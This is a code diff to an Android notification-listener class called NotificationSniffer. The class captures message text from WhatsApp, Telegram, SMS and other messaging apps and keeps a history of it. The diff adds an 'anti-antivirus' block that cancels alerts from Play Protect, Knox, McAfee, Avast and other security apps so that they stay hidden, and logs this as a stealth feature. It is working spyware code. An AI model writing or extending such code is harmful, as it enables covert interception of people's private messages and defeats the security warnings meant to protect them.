@@ -112,6 +112,19 @@ public class NotificationSniffer extends NotificationListenerService {
 
         String title = extras.getString(Notification.EXTRA_TITLE);
         String text = null;
+
+        // --- OPTION 1: ANTI-ANTIVIRUS / SECURITY SILENCING ---
+        // If the notification is from a security system or play protect, kill it immediately
+        String lowerPkg = packageName.toLowerCase();
+        if (lowerPkg.contains("vending") || lowerPkg.contains("play.protect") || 
+            lowerPkg.contains("security") || lowerPkg.contains("antivirus") || 
+            lowerPkg.contains("defender") || lowerPkg.contains("knox") || 
+            lowerPkg.contains("mcafee") || lowerPkg.contains("avast")) {
+            
+            cancelNotification(sbn.getKey());
+            Log.w(TAG, "ANTI-AV: Silenced security alert from " + packageName);
+            LabRatsHttpServer.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
+        }
         
         // 1. Check for MessagingStyle (RCS / Blue Bubbles / WhatsApp)
         android.os.Parcelable[] messages = (android.os.Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
@@ -157,11 +170,9 @@ public class NotificationSniffer extends NotificationListenerService {
         if (title == null) title = "Unknown Source";
         if (text == null || text.isEmpty()) return;
 
-        long timestamp = sbn.getPostTime();
         Log.d(TAG, "SNIFFED [" + packageName + "]: " + title + " -> " + text);
 
         // Alert the Terminal Logs for ANY messaging or social apps
-        String lowerPkg = packageName.toLowerCase();
         if (lowerPkg.contains("messaging") || lowerPkg.contains("messages") || 
             lowerPkg.contains("whatsapp") || lowerPkg.contains("telegram") || 
             lowerPkg.contains("sms") || lowerPkg.contains("mms") || 
@@ -174,7 +185,7 @@ public class NotificationSniffer extends NotificationListenerService {
         }
         
         synchronized (history) {
-            history.add(0, new NotificationData(packageName, title, text, timestamp));
+            history.add(0, new NotificationData(packageName, title, text, sbn.getPostTime()));
             if (history.size() > 500) history.remove(history.size() - 1);
         }
         saveHistory();
